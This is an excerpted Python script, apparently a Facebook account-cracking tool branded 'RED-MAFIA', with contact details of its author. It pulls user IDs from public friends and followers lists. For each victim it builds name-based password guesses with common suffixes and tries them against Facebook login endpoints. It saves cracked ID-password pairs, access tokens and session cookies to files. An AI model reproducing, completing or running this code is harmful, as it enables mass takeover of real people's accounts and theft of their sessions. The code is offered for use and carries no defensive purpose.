...
def logo():
	os.system("clear")
	print("""\x1b[0;32m       ╔════════════════════════════════════════════╗
\x1b[0;33m       ║        WELCOME TO RED-MAFIA TOOL.     ║
\x1b[0;33m       ║       #TOOL AUTHOR [RED-MAFIA(RIAZ)].      ║
\x1b[0;33m       ╚════════════════════════════════════════════╝
\x1b[0;35m        ------------COMING ZOON(RED-MAFIA)------------
\x1b[0;33m       ╔════════════════════════════════════════════╗
\x1b[0;33m       ║#AUTHER : RED-MAFIA(RK).║
\x1b[0;33m       ║#FACEBOOK : RED-MAFIA[FB PE NAME NAHI  ].║
\x1b[0;33m       ║#GITHUB : https://github.com/Red-Mafia.║
\x1b[0;33m       ║#WHATSAPP : +923188214452.                  ║
\x1b[0;33m       ╚════════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
...
def menu():
	...
	print("\n\033[1;90m[\033[1;94m01\033[1;91m] CRACK ID FROM PUBLIC FRIENDS")
	print("\033[1;91m[\033[1;94m02\033[1;92m] CRACK ID FROM PUBLIC FOLLOWERS")
	print("\033[1;92m[\033[1;94m03\033[1;93m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")
	print("\033[1;93m[\033[1;94m04\033[1;94m] Chack Crack Results")
	print("\033[1;94m[\033[1;94m05\033[1;92m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")
	print("\033[1;95m[\033[1;94m00\033[1;92m] Exit\033[1;97m [ \033[1;91mDELETE TOKEN \033[1;97m]")
...
def method():
	print("\n\033[1;93m[\033[1;94m?\033[1;31m] CHOOSE CRACKING MATHORD")
	print("\033[1;93m[\033[1;94m1\033[1;99m] B-API\033[1;97m [ \033[1;95mREDMAFIA PRO/FASTER \033[1;97m]")
	print("\033[1;93m[\033[1;94m2\033[1;99m] MBASIC\033[1;93m [ \033[1;95mFAST \033[1;97m]")
	print("\033[1;93m[\033[1;94m3\033[1;99m] FREE FACEBOOK\033[1;93m [ \033[1;95mNORMAL\033[1;97m]")
	method = raw_input("\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/n\033[1;97m [ \033[1;96mDefault : n \033[1;97m] : ")
		if ask == "y":
			manual()
		print(" ")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[RK-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	try:
		...
		ua = ("Mozilla/5.0 (Linux; Android 11; V2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"786", name+"786786", name+"112233", name+"1122", "pakistan", "pakistan123", "pakistan786", "pakistan1122", "786786" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"786", name+"786786", name+"112233", name+"1122", "pakistan", "pakistan123", "pakistan786", "pakistan1122", "786786" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", name+"786", name+"786786", name+"112233", name+"1122", "pakistan", "pakistan123", "pakistan786", "pakistan1122", "786786" ]
	else:
		pwx = [ name+"123", name+"12345", name+"786", name+"786786", name+"112233", name+"1122", "pakistan", "pakistan123", "pakistan786", "pakistan1122", "786786" ]
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;94m[RK-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;95m[RK-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RK-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RK-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[RK-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RK-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def setting_ua():
	...
	if ua =="":
		...
		print("Mozilla/5.0 (Linux; Android 11; V2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
